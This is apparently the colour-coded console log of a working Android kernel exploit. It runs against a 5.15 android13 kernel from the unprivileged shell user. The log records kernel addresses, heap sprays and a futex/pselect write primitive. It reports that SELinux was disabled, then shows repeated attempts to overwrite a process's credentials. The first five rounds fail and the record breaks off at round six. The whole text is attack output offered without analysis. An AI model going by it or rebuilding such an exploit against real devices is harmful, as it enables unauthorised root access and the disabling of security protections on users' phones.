[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=5184 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=5184 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=5184 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=5184 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+1467ms] pre-W1 drain
[33m[*] [0mWrite 1 attempt 1/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+1467ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15203..16135] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+10587ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff8012898000 fake_lock=ffffff8012898000 fake_w0=ffffff8012898300 fake_task=ffffff8012898400 in0=0000000000000000 in3=ffffff8012898000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +207ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+11835ms]   PI route done
[32m[+] [0mSELinux DISABLED
[33m[*] [0m[T+11936ms] Write 1 complete
[33m[*] [0m[T+13350ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff808d011200 (52/256 votes)
[33m[*] [0m[T+13609ms] perf_find_task done
[33m[*] [0mchild_pid=12662 child_task=0xffffff808d011200
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+15148ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[13207..14992] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+24092ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff80f0b30000 fake_lock=ffffff80f0b30000 fake_w0=ffffff80f0b30300 fake_task=ffffff80f0b30400 in0=0000000000000000 in3=ffffff80f0b30000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+25300ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+34580ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[12032..15491] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+45473ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff8018538000 fake_lock=ffffff8018538000 fake_w0=ffffff8018538300 fake_task=ffffff8018538400 in0=0000000000000000 in3=ffffff8018538000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+46708ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 3/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+56765ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[12129..16262] slowest_rejected=6
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+71387ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff80f1898000 fake_lock=ffffff80f1898000 fake_w0=ffffff80f1898300 fake_task=ffffff80f1898400 in0=0000000000000000 in3=ffffff80f1898000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+72617ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 4/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+89622ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[17564..22957] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+108670ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff80f2ba8000 fake_lock=ffffff80f2ba8000 fake_w0=ffffff80f2ba8300 fake_task=ffffff80f2ba8400 in0=0000000000000000 in3=ffffff80f2ba8000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +2ms
[33m[*] [0mpselect post-select +207ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+109893ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 5/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+122363ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[10526..15338] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+134658ms]   heap spray done
[31m[-] [0mpselect cannot place tree_pc waiter_word=2 global_word=-4 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_right waiter_word=3 global_word=-3 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place tree_left waiter_word=4 global_word=-2 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place pi_parent waiter_word=5 global_word=-1 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-6 page=ffffff80d1fa0000 fake_lock=ffffff80d1fa0000 fake_w0=ffffff80d1fa0300 fake_task=ffffff80d1fa0400 in0=0000000000000000 in3=ffffff80d1fa0000 out0=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +205ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+135897ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 6/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff808d011998 mode=2
[33m[*] [0m[T+149181ms]   heap spray start
